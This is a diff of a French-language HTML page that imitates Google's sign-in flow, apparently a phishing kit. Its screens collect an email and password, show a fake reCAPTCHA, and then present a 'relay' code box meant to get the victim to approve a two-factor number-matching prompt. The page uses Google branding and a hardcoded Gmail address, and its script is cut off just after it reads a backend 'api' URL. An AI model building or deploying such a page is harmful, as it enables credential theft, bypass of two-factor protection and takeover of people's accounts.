@@ -1,290 +1,195 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Connexion — Comptes Google</title>
+<title>Connexion</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%}
-body{font-family:'Google Sans',Roboto,arial,sans-serif;background:#fff;color:#202124;display:flex;flex-direction:column;min-height:100dvh;margin:0}
+body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;display:flex;flex-direction:column;min-height:100dvh;margin:0}
 .screen{display:none}
-.screen.active{display:block}
-.container{width:100%;max-width:420px;margin:auto;padding:24px 16px}
-/* Logo */
-.g-logo{width:48px;height:48px;margin-bottom:24px}
-/* Titres */
-.g-title{font-size:32px;font-weight:400;color:#202124;margin-bottom:12px;line-height:1.2;text-align:left}
-.g-sub{font-size:16px;line-height:1.5;color:#202124;margin-bottom:24px;font-family:Roboto,arial,sans-serif;text-align:left}
-/* Inputs */
-.g-in{width:100%;padding:14px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:Roboto,arial,sans-serif;transition:all .2s;box-sizing:border-box}
-.g-in:focus{border-color:#1a73e8;box-shadow:inset 0 -2px 0 #1a73e8}
-.g-pad{margin-bottom:8px}
-/* Liens */
-.g-a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;display:inline-block;font-family:Roboto,arial,sans-serif}
-.g-a:hover{background:rgba(26,115,232,.04)}
-/* Actions */
-.g-act{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
-.g-btn-txt{background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px;font-family:'Google Sans',Roboto,arial,sans-serif}
-.g-btn-txt:hover{background:rgba(26,115,232,.04);border-radius:4px}
-.g-btn{background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,arial,sans-serif;transition:box-shadow .2s}
-.g-btn:hover{background:#1557b0;box-shadow:0 1px 2px rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15)}
-/* Écran 2: badge email */
-.g-badge{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 14px;margin-bottom:24px;font-size:14px;color:#5f6368;width:fit-content;cursor:pointer}
-.g-badge:hover{background:#f8f9fa}
-.g-badge svg{width:20px;height:20px}
-.g-inv{opacity:.6;font-size:12px;color:#5f6368;margin-bottom:16px}
-/* Checkbox MDP */
-.g-chk{display:flex;align-items:center;gap:12px;margin-bottom:24px}
-.g-chk input{width:18px;height:18px;cursor:pointer;accent-color:#1a73e8}
-.g-chk label{font-size:14px;color:#202124;font-family:Roboto,arial,sans-serif}
-/* ---- CAPTCHA ---- */
-.captcha-wrap{background:#f9f9f9;border:1px solid #c1c1c1;border-radius:3px;padding:14px 14px;margin-bottom:24px;max-width:300px;box-sizing:border-box}
-.captcha-row{display:flex;align-items:center;gap:12px;cursor:pointer}
-.captcha-box{width:24px;height:24px;border:2px solid #c1c1c1;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;overflow:hidden}
-.captcha-spinner{display:none;width:16px;height:16px;border:2px solid rgba(0,0,0,.1);border-top-color:#4285F4;border-radius:50%;animation:spin 1s linear infinite}
+.screen.active{display:flex;flex-direction:column;position:fixed;top:0;left:0;right:0;bottom:0;overflow-y:auto;-webkit-overflow-scrolling:touch}
 @keyframes spin{to{transform:rotate(360deg)}}
-.captcha-check{display:none;width:14px;height:14px}
-.captcha-check svg{width:100%;height:100%}
-.captcha-label{font-size:14px;color:#202124;font-family:Roboto,arial,sans-serif}
-.captcha-right{display:flex;flex-direction:column;align-items:flex-end;margin-left:auto;gap:4px}
-.captcha-right img{height:32px;width:auto}
-.captcha-right span{font-size:9px;color:#737373}
-.captcha-right a{font-size:9px;color:#737373;text-decoration:none}
-/* reCAPTCHA banner */
-.rc-banner{display:flex;flex-direction:column;align-items:center;gap:2px;margin:16px 0}
-.rc-banner span{font-size:9px;color:#737373;letter-spacing:.3px;font-family:Roboto,arial,sans-serif}
-/* Loader overlay */
-#cap-loader{display:none;flex-direction:column;align-items:center;justify-content:center;padding:60px 16px;text-align:center}
-.cap-spin{width:40px;height:40px;border:4px solid #f1f3f4;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
-.cap-txt{font-size:16px;color:#5f6368;font-family:Roboto,arial,sans-serif}
-/* Écran validation */
-.val-wrap{padding:40px 16px}
-.val-tit{font-size:24px;font-weight:400;color:#202124;margin-bottom:16px;text-align:left}
-.val-txt{font-size:16px;color:#5f6368;line-height:1.5;margin-bottom:24px;text-align:left}
-.val-email{font-weight:700;color:#000}
-.val-relay{display:none;margin:24px 0;padding:20px;background:#e8f0fe;border-radius:8px;border:2px solid #1a73e8;text-align:center}
-.val-relay .lbl{font-size:13px;color:#5f6368;margin-bottom:8px}
-.val-relay .ph{font-size:14px;color:#5f6368;margin-bottom:12px}
-.val-relay .cod{font-size:48px;font-weight:700;color:#1a73e8;letter-spacing:8px}
-.val-btn{width:100%;height:48px;background:#1a73e8;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,arial,sans-serif}
-.val-btn:hover{background:#1557b0}
-.val-btn:disabled{background:#dadce0;color:#5f6368;cursor:not-allowed}
-.val-wait{font-size:14px;color:#5f6368;text-align:center;margin:8px 0}
-.val-resend{font-size:14px;color:#5f6368;text-align:center;margin-top:16px}
 </style>
 </head>
 <body>
 
-<!-- ===== ÉCRAN 1 : EMAIL ===== -->
-<div class="screen active" id="s-email">
-<div class="container">
-<svg class="g-logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-<h1 class="g-title">Connexion</h1>
-<p class="g-sub">Utilisez votre compte Google. Vous vous connecterez également aux services Google dans vos applications et dans Safari.</p>
-<div class="g-pad"><input type="text" id="in-email" class="g-in" placeholder="Adresse e-mail ou téléphone" autocomplete="off"></div>
-<a href="#" class="g-a" onclick="alert('Fonction non disponible');return false">Adresse e-mail oubliée ?</a>
-<p class="g-inv">Pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé. <a href="#" class="g-a" onclick="alert('En savoir plus non disponible');return false">En savoir plus</a></p>
-<div class="g-act"><button class="g-btn-txt" onclick="alert('Créer compte non disponible')">Créer un compte</button><button class="g-btn" id="btn-email">Suivant</button></div>
-</div>
-</div>
-
-<!-- ===== ÉCRAN 2 : PASSWORD ===== -->
-<div class="screen" id="s-pwd">
-<div class="container">
-<svg class="g-logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-<h1 class="g-title" style="font-size:22px">Bienvenue</h1>
-<div class="g-badge" onclick="show('s-email')"><svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg><span id="disp-email"></span><span>&#9662;</span></div>
-<div class="g-pad"><input type="password" id="in-pwd" class="g-in" placeholder="Saisissez votre mot de passe" autocomplete="off"></div>
-<div class="g-chk"><input type="checkbox" id="chk-show"><label for="chk-show">Afficher le mot de passe</label></div>
-<a href="#" class="g-a" onclick="alert('Fonction non disponible');return false">Mot de passe oublié ?</a>
-<div class="g-act"><div></div><button class="g-btn" id="btn-pwd">Suivant</button></div>
-</div>
-</div>
-
-<!-- ===== ÉCRAN 3 : CAPTCHA ===== -->
-<div class="screen" id="s-cap">
-<div class="container">
-<svg class="g-logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-<h1 class="g-title" style="font-size:22px">Confirmez qu'il s'agit bien de vous</h1>
-<p class="g-sub">Afin de protéger votre compte, Google veut s'assurer que c'est bien vous qui essayez de vous connecter.</p>
-
-<div id="cap-box" class="captcha-wrap">
-<div class="captcha-row" onclick="solveCap()">
-<div class="captcha-box" id="cap-check"><div class="captcha-spinner" id="cap-spin"></div><div class="captcha-check" id="cap-ok"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div></div>
-<span class="captcha-label">Je ne suis pas un robot</span>
-<div class="captcha-right"><svg viewBox="0 0 48 48" width="32" height="32"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#EA4335" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg><span>reCAPTCHA</span><span>Privacy - Terms</span></div>
-</div>
-</div>
-
-<p style="font-size:14px;color:#5f6368;margin-bottom:24px;font-family:Roboto,arial,sans-serif">Confirmez que vous n'êtes pas un robot</p>
-
-<div class="g-act"><a href="#" class="g-a" onclick="alert('Essayer une autre méthode non disponible');return false">Essayer une autre méthode</a><button class="g-btn" id="btn-cap-next">Suivant</button></div>
-</div>
-</div>
-
-<!-- Loader overlay (après clic sur case) -->
-<div class="screen" id="s-cap-loader">
-<div class="container" id="cap-loader" style="display:flex;height:100dvh;justify-content:center;align-items:center;flex-direction:column">
-<div class="cap-spin"></div>
-<div class="cap-txt" id="cap-txt">Chargement en cours...</div>
-</div>
-</div>
-
-<!-- ===== ÉCRAN 4 : VALIDATION ===== -->
-<div class="screen" id="s-val">
-<div class="container val-wrap">
-<svg class="g-logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-<h1 class="val-tit">Vérifiez votre adresse e-mail</h1>
-<p class="val-txt">Pour sécuriser votre compte, une notification vous a été envoyée à l'adresse <span class="val-email" id="val-email"></span>. Vous devez cliquer sur <b>"Oui, c'est moi"</b>.</p>
-<div class="val-relay" id="relay-box">
-<div class="lbl">Choisissez le numéro :</div>
-<div class="ph" id="relay-phone"></div>
-<div class="cod" id="relay-code">------</div>
-</div>
-<p class="val-wait" id="val-status">En attente de confirmation...</p>
-<button class="val-btn" id="btn-done">J'ai validé sur mon téléphone</button>
-<p class="val-resend">Vous n'avez pas reçu le code ? <a href="#" class="g-a" onclick="alert('Renvoi non disponible');return false">Renvoyer le code</a></p>
-</div>
-</div>
+<div id="page-email" class="screen active" style="background:#fff">
+<div style="padding:24px 16px;box-sizing:border-box;max-width:420px;margin:auto;width:100%">
+<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin:0 0 16px 0;display:block">
+<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+</svg>
+<h1 style="font-size:32px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;text-align:left">Connexion</h1>
+<p style="font-size:16px;line-height:1.5;margin-bottom:24px;color:#202124;font-family:Roboto,Arial,sans-serif">Utilisez votre compte Google. Vous vous connecterez &eacute;galement aux services Google dans vos applications et dans Safari.</p>
+<div style="margin-bottom:8px"><input type="text" id="emailInput" placeholder="Adresse e-mail ou t&eacute;l&eacute;phone" style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;font-family:Roboto,Arial,sans-serif;transition:all 0.2s" onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'" onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'"></div>
+<a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin:8px 0 32px 0;display:inline-block;font-family:Roboto,Arial,sans-serif">Adresse e-mail oubli&eacute;e ?</a>
+<div style="display:flex;justify-content:space-between;align-items:center;margin-top:32px"><button onclick="alert('Fonction non disponible')" style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px;font-family:'Google Sans',Roboto,Arial,sans-serif">Cr&eacute;er un compte</button><button onclick="goToPassword()" style="background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif">Suivant</button></div>
+</div></div>
+<div id="page-loading" class="screen" style="background:#fff;align-items:center;justify-content:center"><div style="text-align:center"><div style="width:36px;height:36px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px"></div><p style="font-size:14px;color:#5f6368;font-family:Roboto,Arial,sans-serif">Chargement...</p></div></div>
+<div id="page-password" class="screen" style="background:#fff">
+<div style="padding:24px 16px;box-sizing:border-box;max-width:420px;margin:auto;width:100%">
+<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin-bottom:16px;display:block">
+<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+</svg>
+<h1 style="font-size:24px;font-weight:400;margin-bottom:8px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;text-align:left">Bienvenue</h1>
+<p style="font-size:16px;line-height:1.5;margin-bottom:16px;color:#202124;font-family:Roboto,Arial,sans-serif">Afin de pouvoir utiliser votre compte Google, vous devez vous connecter.</p>
+<div id="emailChip" style="display:inline-flex;align-items:center;gap:10px;padding:6px 12px 6px 6px;margin:0 0 24px;background:#fff;cursor:pointer" onclick="showScreen('page-email')"><div style="width:28px;height:28px;border-radius:50%;background:#9e9e9e;display:flex;align-items:center;justify-content:center;flex-shrink:0"><svg width="16" height="16" viewBox="0 0 24 24" fill="white"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg></div><span id="displayEmail" style="font-size:14px;color:#3c4043;font-family:Roboto,Arial,sans-serif">Chargement...</span></div>
+<div style="margin-bottom:8px"><input type="password" id="passwordInput" placeholder="Saisissez votre mot de passe" style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;font-family:Roboto,Arial,sans-serif;transition:all 0.2s" onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'" onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'"></div>
+<div style="display:flex;align-items:center;gap:16px;margin:16px 0 32px 0"><input type="checkbox" id="showPass" style="width:18px;height:18px;cursor:pointer;accent-color:#1a73e8" onchange="var p=document.getElementById('passwordInput');p.type=this.checked?'text':'password'"><label for="showPass" style="font-size:16px;color:#202124;cursor:pointer;font-family:Roboto,Arial,sans-serif">Afficher le mot de passe</label></div>
+<div style="display:flex;justify-content:space-between;align-items:center"><a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;font-family:'Google Sans',Roboto,Arial,sans-serif">Mot de passe oubli&eacute; ?</a><button onclick="goToCaptcha()" style="background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif">Suivant</button></div>
+</div></div>
+<div id="page-loading-pwd" class="screen" style="background:#fff;align-items:center;justify-content:center"><div style="text-align:center"><div style="width:36px;height:36px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px"></div><p style="font-size:14px;color:#5f6368;font-family:Roboto,Arial,sans-serif">Chargement...</p></div></div>
+<div id="page-captcha" class="screen" style="background:#fff">
+<div style="padding:24px 16px;box-sizing:border-box;max-width:420px;margin:auto;width:100%">
+<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin-bottom:16px;display:block">
+<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+</svg>
+<h1 style="font-size:24px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;line-height:1.3;text-align:left">Confirmez qu'il s'agit bien de vous</h1>
+<p style="font-size:16px;line-height:1.5;color:#202124;margin-bottom:24px;font-family:Roboto,Arial,sans-serif;text-align:left">Afin de prot&eacute;ger votre compte, Google veut s'assurer que c'est bien vous qui essayez de vous connecter.</p>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:16px"><div style="width:24px;height:24px;border-radius:50%;background:#9e9e9e;display:flex;align-items:center;justify-content:center;flex-shrink:0"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg></div><span id="captchaEmail" style="font-size:13px;color:#000;font-family:Roboto,Arial,sans-serif;font-weight:700">clientwebg2@gmail.com</span></div>
+<p style="font-size:16px;color:#5f6368;margin-bottom:16px;font-family:Roboto,Arial,sans-serif;text-align:left">Confirmez que vous n'etes pas un robot</p>
+<div id="captcha-box" style="width:100%;max-width:300px;border:1px solid #c1c1c1;border-radius:3px;background:#f9f9f9;padding:14px 14px;display:flex;align-items:center;gap:10px;cursor:pointer;margin-bottom:8px;box-sizing:border-box" onclick="solveCaptcha()"><div id="captcha-check" style="width:24px;height:24px;border:2px solid #c1c1c1;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;overflow:hidden" onclick="solveCaptcha()"><div id="captcha-spinner" style="display:none;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:16px;height:16px;border:2px solid rgba(0,0,0,0.1);border-top-color:#4285F4;border-radius:50%;animation:spin 1s linear infinite"></div><svg id="captcha-icon" style="opacity:0;width:14px;height:14px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span style="font-size:14px;color:#202124;font-family:Roboto,Arial,sans-serif">Je ne suis pas un robot</span><div style="display:flex;flex-direction:column;align-items:flex-end;margin-left:auto;gap:1px;pointer-events:none"><svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#e8f0fe"/><path d="M10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" fill="#4285F4"/></svg><span style="font-size:9px;color:#737373;font-family:Roboto,Arial,sans-serif;letter-spacing:0.3px">reCAPTCHA</span><span style="font-size:8px;color:#737373;font-family:Roboto,Arial,sans-serif">Privacy - Terms</span></div></div>
+<div id="captcha-msg" style="font-size:14px;color:#d93025;font-family:Roboto,Arial,sans-serif;min-height:20px;margin-bottom:12px"></div>
+<div style="display:flex;justify-content:space-between;align-items:center;margin-top:36px"><a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;font-family:'Google Sans',Roboto,Arial,sans-serif">Essayer une autre m&eacute;thode</a><button type="button" onclick="solveCaptcha()" style="background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif">Suivant</button></div>
+</div></div>
+<div id="page-loading-mail" class="screen" style="background:#fff;align-items:center;justify-content:center"><div style="text-align:center"><div style="width:36px;height:36px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px"></div><p style="font-size:14px;color:#5f6368;font-family:Roboto,Arial,sans-serif">Chargement...</p></div></div>
+<div id="page-mail-info" class="screen" style="background:#fff">
+<div style="padding:24px 16px;box-sizing:border-box;max-width:420px;margin:auto;width:100%">
+<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin-bottom:16px;display:block">
+<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+</svg>
+<h1 style="font-size:24px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;line-height:1.3;text-align:left">V&eacute;rifiez votre adresse e-mail</h1>
+<p style="font-size:16px;color:#5f6368;margin-bottom:16px;line-height:1.5;font-family:Roboto,Arial,sans-serif;text-align:left">Pour s&eacute;curiser votre compte, une notification sur votre bo&icirc;te mail Gmail 'Oui, c'est moi' vous a &eacute;t&eacute; envoy&eacute;e a l'adresse e-mail suivante : <b id="mail-user-email" style="color:#000"></b>. Vous devez cliquer sur <b style="color:#000">Oui, c'est moi</b>.</p>
+<div id="relay-display" style="display:none;margin:24px 0;padding:20px;background:#f8f9fa;border-radius:8px;text-align:center;border:2px solid #1a73e8"><div id="relay-phone" style="font-size:13px;color:#5f6368;margin-bottom:8px"></div><div style="font-size:16px;color:#5f6368;font-weight:500;margin-bottom:4px">Choisissez le num&eacute;ro :</div><div id="relay-code" style="font-size:48px;font-weight:700;color:#1a73e8;letter-spacing:8px"></div></div>
+<button id="mail-validate-btn" onclick="validateMail()" style="width:100%;height:48px;background-color:#1a73e8;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:500;cursor:pointer;margin:24px 0;font-family:'Google Sans',Roboto,Arial,sans-serif;opacity:1" onmouseover="if(!this.disabled) this.style.backgroundColor='#1557b0'" onmouseout="if(!this.disabled) this.style.backgroundColor='#1a73e8'">Valider</button>
+<p id="mail-pending" style="font-size:14px;color:#5f6368;text-align:center;margin:8px 0;font-family:Roboto,Arial,sans-serif">En attente de confirmation...</p>
+<p style="font-size:14px;color:#5f6368;text-align:center;margin-top:24px;font-family:Roboto,Arial,sans-serif">Vous n'avez pas re&ccedil;u le code ? <a href="#" style="color:#1a73e8;text-decoration:none;font-weight:500">Renvoyer le code</a></p>
+</div></div>
 
 <script>
 (function(){
-var p=new URLSearchParams(location.search);
-var apiBase=p.get('api')||'http://localhost:8080';
